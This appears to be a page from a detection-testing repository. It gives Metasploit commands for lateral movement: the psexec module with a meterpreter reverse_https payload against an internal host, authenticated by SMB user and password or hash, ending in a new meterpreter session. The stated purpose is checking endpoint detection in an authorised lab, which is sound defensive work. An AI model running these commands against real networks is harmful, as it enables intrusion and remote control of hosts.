# Phase 2 Testing

## Lateral movement

This test starts at the conclusion of [Phase 1](https://github.com/blumirabrian/endpoint-detection-methology/blob/main/msf/MSF-Phase-1.md) complete that test first before starting Phase 2.

For this test we will move laterally using the PsExec module in metasploit. We are using an assume breach methodology so run test with a user that has administrative permissions to the test user or is domain admin on the testing domain.

```
use exploit/windows/smb/psexec

msf6 exploit(windows/smb/psexec) > set payload windows/meterpreter/reverse_https

msf6 exploit(windows/smb/psexec) > set RHOST 172.16.2.X

set SMBDomain miratime.org
set SMBUser exampleuser
set SMBPass HASH/PW
set SESSION N

msf6 exploit(windows/smb/psexec) > exploit -j
```
Upon successful execution of this test you should get a new meterpreter session on the server.




